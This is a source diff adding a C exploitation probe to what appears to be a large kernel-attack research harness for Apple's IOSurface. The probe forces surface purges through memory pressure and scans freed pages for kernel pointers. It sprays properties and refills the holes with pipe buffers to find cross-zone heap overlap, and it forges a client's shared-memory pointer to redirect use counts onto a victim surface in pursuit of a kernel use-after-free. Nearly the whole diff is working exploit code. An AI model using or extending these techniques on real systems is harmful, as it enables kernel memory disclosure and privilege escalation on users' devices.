@@ -16464,6 +16464,344 @@ static void r410_probe(void) {
 }
 
 /*
+ * r414: Aggressive purge + pipe buffer cross-zone + use count manipulation.
+ *
+ * 1) Force IOSurface purge with massive IOSurface-specific pressure
+ * 2) After purge, spray pipe data into freed pages and read back
+ * 3) Try use count manipulation through redirect for kernel UAF
+ */
+static volatile int g_r414_crashed = 0;
+static sigjmp_buf g_r414_jmp;
+static void r414_sighandler(int sig) {
+    g_r414_crashed = sig;
+    siglongjmp(g_r414_jmp, 1);
+}
+
+static void r414_probe(void) {
+    rlog("\n=== r414: Aggressive Purge + Pipe Buffer + UseCount ===\n\n");
+    fflush(stdout);
+
+    struct sigaction sa414, old_bus414, old_segv414;
+    memset(&sa414, 0, sizeof(sa414));
+    sa414.sa_handler = r414_sighandler;
+    sa414.sa_flags = 0;
+    sigaction(SIGBUS, &sa414, &old_bus414);
+    sigaction(SIGSEGV, &sa414, &old_segv414);
+
+    unsigned pixFmt = 'BGRA';
+    const void *skeys[] = {
+        kIOSurfaceWidth, kIOSurfaceHeight,
+        kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+        kIOSurfaceAllocSize
+    };
+
+    /* ---- Vector 1: Aggressive IOSurface-specific purge ---- */
+    rlog("  Vector 1: Aggressive IOSurface purge cycle\n");
+    {
+        /* Create target surface with small backing store */
+        int tw = 64, th = 64, tbpr = 256, tas = 16384;
+        CFNumberRef tv[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &tw),
+            CFNumberCreate(NULL, kCFNumberIntType, &th),
+            CFNumberCreate(NULL, kCFNumberIntType, &tbpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &tas)
+        };
+        CFDictionaryRef tprops = CFDictionaryCreate(NULL, skeys,
+            (const void**)tv, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef target = IOSurfaceCreate(tprops);
+        uint32_t targetId = IOSurfaceGetID(target);
+        rlog("    Target surface ID=%u (16KB backing)\n", targetId);
+
+        /* Write known pattern to target */
+        IOSurfaceLock(target, 0, NULL);
+        void *tbase = IOSurfaceGetBaseAddress(target);
+        memset(tbase, 0xAA, 16384);
+        IOSurfaceUnlock(target, 0, NULL);
+
+        /* Mark target as purgeable volatile */
+        uint32_t oldState = 0;
+        IOReturn ret = IOSurfaceSetPurgeable(target,
+            kIOSurfacePurgeableVolatile, &oldState);
+        rlog("    Target set volatile: ret=0x%x oldState=%u\n", ret, oldState);
+
+        /* Create massive IOSurface pressure - 2MB each × 400 = 800MB */
+        int pw = 512, ph = 512, pbpr = 2048, pas = 2 * 1024 * 1024;
+        CFNumberRef pv[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &pw),
+            CFNumberCreate(NULL, kCFNumberIntType, &ph),
+            CFNumberCreate(NULL, kCFNumberIntType, &pbpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &pas)
+        };
+        CFDictionaryRef pprops = CFDictionaryCreate(NULL, skeys,
+            (const void**)pv, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef pressure[400];
+        int created = 0;
+        for (int i = 0; i < 400; i++) {
+            pressure[i] = IOSurfaceCreate(pprops);
+            if (!pressure[i]) break;
+            /* Force allocation by writing */
+            IOSurfaceLock(pressure[i], 0, NULL);
+            void *pb = IOSurfaceGetBaseAddress(pressure[i]);
+            if (pb) memset(pb, 0x42 + (i & 0xFF), 4096);
+            IOSurfaceUnlock(pressure[i], 0, NULL);
+            created++;
+        }
+        rlog("    Created %d × 2MB pressure surfaces = %dMB\n",
+            created, created * 2);
+
+        /* Also add mmap pressure on top */
+        void *mmapPressure[50];
+        int mmapCount = 0;
+        for (int i = 0; i < 50; i++) {
+            mmapPressure[i] = mmap(NULL, 64 * 1024 * 1024,
+                PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+            if (mmapPressure[i] != MAP_FAILED) {
+                memset(mmapPressure[i], 0x99, 64 * 1024 * 1024);
+                mmapCount++;
+            } else break;
+        }
+        rlog("    + %d × 64MB mmap = %dMB total extra\n",
+            mmapCount, mmapCount * 64);
+
+        /* Check if target was purged */
+        uint32_t checkState = 0;
+        ret = IOSurfaceSetPurgeable(target,
+            kIOSurfacePurgeableNonVolatile, &checkState);
+        rlog("    Target set non-volatile: ret=0x%x oldState=%u\n",
+            ret, checkState);
+
+        int wasPurged = (checkState > kIOSurfacePurgeableVolatile);
+        rlog("    *** Target was %s ***\n",
+            wasPurged ? "PURGED!" : "NOT purged");
+
+        /* Read target backing store */
+        IOSurfaceLock(target, kIOSurfaceLockReadOnly, NULL);
+        void *tbase2 = IOSurfaceGetBaseAddress(target);
+        int nonZero = 0, kptrs = 0, aaCount = 0;
+        if (tbase2) {
+            for (int off = 0; off < 16384; off += 8) {
+                uint64_t val = *(volatile uint64_t*)((uint8_t*)tbase2 + off);
+                if (val != 0) nonZero++;
+                if (val == 0xAAAAAAAAAAAAAAAAULL) aaCount++;
+                uint16_t top = (uint16_t)(val >> 48);
+                if (top >= 0xfff0 && top <= 0xfffe &&
+                    val != 0xffffffffffffffff) {
+                    rlog("    backing+%d: 0x%016llx <KERNEL!!!>\n",
+                        off, (unsigned long long)val);
+                    kptrs++;
+                    if (kptrs > 20) break;
+                }
+            }
+        }
+        rlog("    Backing: %d non-zero, %d still-0xAA, %d kernel ptrs\n",
+            nonZero, aaCount, kptrs);
+        IOSurfaceUnlock(target, kIOSurfaceLockReadOnly, NULL);
+
+        /* Cleanup */
+        for (int i = 0; i < mmapCount; i++)
+            munmap(mmapPressure[i], 64 * 1024 * 1024);
+        for (int i = 0; i < created; i++)
+            CFRelease(pressure[i]);
+        CFRelease(target);
+        CFRelease(pprops);
+        CFRelease(tprops);
+        for (int i = 0; i < 5; i++) { CFRelease(pv[i]); CFRelease(tv[i]); }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: Pipe buffer overlap test ---- */
+    rlog("\n  Vector 2: Pipe buffer kernel heap overlap\n");
+    {
+        /* Spray IOSurface properties of pipe-buffer size (16KB),
+         * free alternating, write to pipes, read back via CopyAllValues.
+         */
+        int tw = 64, th = 64, tbpr = 256, tas = 16384;
+        CFNumberRef tv2[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &tw),
+            CFNumberCreate(NULL, kCFNumberIntType, &th),
+            CFNumberCreate(NULL, kCFNumberIntType, &tbpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &tas)
+        };
+        CFDictionaryRef p2 = CFDictionaryCreate(NULL, skeys,
+            (const void**)tv2, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        IOSurfaceRef psurf = IOSurfaceCreate(p2);
+
+        /* Spray 100 properties of size ~4096 (page-sized, like pipe buffers) */
+        rlog("    Spraying 100 × 4096-byte properties...\n");
+        uint8_t sprayData[4096];
+        for (int i = 0; i < 100; i++) {
+            memset(sprayData, 0xBB, sizeof(sprayData));
+            *(uint32_t*)sprayData = 0xDEAD0000 | i;
+            CFDataRef d = CFDataCreate(NULL, sprayData, sizeof(sprayData));
+            char key[32];
+            snprintf(key, sizeof(key), "pipe_%03d", i);
+            CFStringRef k = CFStringCreateWithCString(NULL, key,
+                kCFStringEncodingASCII);
+            IOSurfaceSetValue(psurf, k, d);
+            CFRelease(d);
+            CFRelease(k);
+        }
+
+        /* Free even-numbered properties (create holes) */
+        rlog("    Freeing even-indexed properties (50 holes)...\n");
+        for (int i = 0; i < 100; i += 2) {
+            char key[32];
+            snprintf(key, sizeof(key), "pipe_%03d", i);
+            CFStringRef k = CFStringCreateWithCString(NULL, key,
+                kCFStringEncodingASCII);
+            IOSurfaceRemoveValue(psurf, k);
+            CFRelease(k);
+        }
+
+        /* Create 50 pipes and write data */
+        rlog("    Creating 50 pipes and writing 4096 bytes each...\n");
+        int pipefds[50][2];
+        int pipeCreated = 0;
+        for (int i = 0; i < 50; i++) {
+            if (pipe(pipefds[i]) != 0) break;
+            /* Write 4096 bytes (should allocate a pipe buffer in kernel) */
+            uint8_t pdata[4096];
+            memset(pdata, 0xCC, sizeof(pdata));
+            *(uint32_t*)pdata = 0xBEEF0000 | i;
+            write(pipefds[i][1], pdata, sizeof(pdata));
+            pipeCreated++;
+        }
+        rlog("    Created %d pipes\n", pipeCreated);
+
+        /* Read back odd-numbered properties to see if any got corrupted */
+        rlog("    Reading back odd-indexed properties...\n");
+        int corrupted = 0;
+        for (int i = 1; i < 100; i += 2) {
+            char key[32];
+            snprintf(key, sizeof(key), "pipe_%03d", i);
+            CFStringRef k = CFStringCreateWithCString(NULL, key,
+                kCFStringEncodingASCII);
+            CFTypeRef val = IOSurfaceCopyValue(psurf, k);
+            if (val) {
+                if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                    const uint8_t *bytes = CFDataGetBytePtr(val);
+                    CFIndex len = CFDataGetLength(val);
+                    uint32_t marker = *(uint32_t*)bytes;
+                    if ((marker & 0xFFFF0000) != 0xDEAD0000) {
+                        rlog("    Property %d CORRUPTED! marker=0x%08x\n",
+                            i, marker);
+                        corrupted++;
+                        /* Scan for kernel pointers */
+                        for (CFIndex j = 0; j + 7 < len; j += 8) {
+                            uint64_t v = *(uint64_t*)(bytes + j);
+                            uint16_t top = (uint16_t)(v >> 48);
+                            if (top >= 0xfff0 && top <= 0xfffe &&
+                                v != 0xffffffffffffffff)
+                                rlog("      +%ld: 0x%016llx <KERNEL!!!>\n",
+                                    (long)j, (unsigned long long)v);
+                        }
+                    }
+                }
+                CFRelease(val);
+            }
+            CFRelease(k);
+        }
+        rlog("    Corrupted properties: %d\n", corrupted);
+
+        /* Cleanup */
+        for (int i = 0; i < pipeCreated; i++) {
+            close(pipefds[i][0]);
+            close(pipefds[i][1]);
+        }
+        CFRelease(psurf);
+        CFRelease(p2);
+        for (int i = 0; i < 5; i++) CFRelease(tv2[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: UseCount manipulation through redirect ---- */
+    rlog("\n  Vector 3: UseCount manipulation through redirect\n");
+    {
+        int tw = 64, th = 64, tbpr = 256, tas = 16384;
+        CFNumberRef tv3[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &tw),
+            CFNumberCreate(NULL, kCFNumberIntType, &th),
+            CFNumberCreate(NULL, kCFNumberIntType, &tbpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &tas)
+        };
+        CFDictionaryRef p3 = CFDictionaryCreate(NULL, skeys,
+            (const void**)tv3, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef victimSurf = IOSurfaceCreate(p3);
+        IOSurfaceRef redirectSurf = IOSurfaceCreate(p3);
+        uint32_t victimId = IOSurfaceGetID(victimSurf);
+        uint32_t redirectId = IOSurfaceGetID(redirectSurf);
+        rlog("    Victim=%u Redirect=%u\n", victimId, redirectId);
+
+        /* Get initial use counts */
+        int32_t vUse = IOSurfaceGetUseCount(victimSurf);
+        int32_t rUse = IOSurfaceGetUseCount(redirectSurf);
+        rlog("    Initial use counts: victim=%d redirect=%d\n", vUse, rUse);
+
+        /* Set up redirect: operations on redirectSurf go to victim */
+        uint8_t *rClient = (uint8_t*)redirectSurf;
+        uint64_t realSharedR = *(uint64_t*)(rClient + 8);
+
+        void *fakeShared = mmap(NULL, 16384,
+            PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        memcpy(fakeShared, (void*)realSharedR, 2048);
+        uint64_t fakeAddr = (uint64_t)fakeShared;
+        *(uint64_t*)((uint8_t*)fakeShared + 88) = ~(fakeAddr + 0x28);
+        *(uint32_t*)((uint8_t*)fakeShared + 136) = victimId;
+        *(uint64_t*)(rClient + 8) = fakeAddr;
+
+        /* Increment use count through redirect (should hit victim) */
+        g_r414_crashed = 0;
+        if (sigsetjmp(g_r414_jmp, 1) == 0) {
+            IOSurfaceIncrementUseCount(redirectSurf);
+            rlog("    After IncrementUseCount through redirect:\n");
+            int32_t vUse2 = IOSurfaceGetUseCount(victimSurf);
+            rlog("      victim useCount=%d (was %d)\n", vUse2, vUse);
+
+            if (vUse2 > vUse) {
+                rlog("    *** USE COUNT REDIRECT WORKS! ***\n");
+                /* Try decrement */
+                IOSurfaceDecrementUseCount(redirectSurf);
+                int32_t vUse3 = IOSurfaceGetUseCount(victimSurf);
+                rlog("    After Decrement: victim useCount=%d\n", vUse3);
+            }
+        } else {
+            rlog("    CRASHED during use count manipulation!\n");
+        }
+
+        /* Restore */
+        *(uint64_t*)(rClient + 8) = realSharedR;
+        munmap(fakeShared, 16384);
+
+        CFRelease(victimSurf);
+        CFRelease(redirectSurf);
+        CFRelease(p3);
+        for (int i = 0; i < 5; i++) CFRelease(tv3[i]);
+    }
+    fflush(stdout);
+
+    sigaction(SIGBUS, &old_bus414, NULL);
+    sigaction(SIGSEGV, &old_segv414, NULL);
+
+    rlog("\n=== r414 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r413: Purgeable redirect + timing oracle + IOSurface internal state.
  *
  * Test IOSurfaceSetPurgeable through cross-surface redirect.
@@ -68858,6 +69196,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 417) {
+            rlog("*** rounds=417: Aggressive Purge + Pipe Buffer + UseCount ***\n");
+            rlog("  Force purge, pipe buffer cross-zone, use count redirect.\n\n");
+            fflush(stdout);
+            r414_probe();
+            goto done;
+        }
         if (rounds == 416) {
             rlog("*** rounds=416: Purgeable Redirect + Timing + Internal State ***\n");
             rlog("  SetPurgeable via redirect, timing oracle, property metadata, port names.\n\n");
@@ -71362,7 +71707,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
